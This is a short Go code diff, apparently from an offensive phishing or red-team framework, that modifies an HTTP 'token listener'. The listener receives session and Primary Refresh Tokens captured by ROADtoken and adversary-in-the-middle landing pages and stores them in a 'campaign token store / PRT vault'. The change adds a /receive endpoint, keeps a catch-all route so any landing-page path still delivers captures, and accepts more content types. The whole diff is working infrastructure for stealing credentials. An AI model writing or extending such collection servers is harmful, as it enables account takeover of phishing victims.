@@ -181,11 +181,17 @@ func (tl *TokenListener) Start(port int) error {
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/token", tl.handleIntake)
-	mux.HandleFunc("/", tl.handleIntake)
+	// ROADtoken / AiTM landing pages built with fetch() POST the capture to
+	// /receive with Content-Type text/plain — accept that path explicitly so it is
+	// documented, not just caught by the "/" fallback below.
+	mux.HandleFunc("/receive", tl.handleIntake)
 	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
 		w.Write([]byte(`{"status":"ok"}`))
 	})
+	// Catch-all: any other path also ingests, so a landing page pointed at a
+	// custom path still works.
+	mux.HandleFunc("/", tl.handleIntake)
 
 	// Bind first so a port clash returns an immediate error instead of failing
 	// silently inside the serving goroutine.
@@ -209,7 +215,7 @@ func (tl *TokenListener) Start(port int) error {
 		}
 	}()
 
-	log.Printf("[token-listener] listening on :%d — POST /token → ingest into campaign token store", port)
+	log.Printf("[token-listener] listening on :%d — POST /token, /receive or / (JSON, form-urlencoded, or text/plain) → ingest into the campaign token store / PRT vault", port)
 	return nil
 }
 
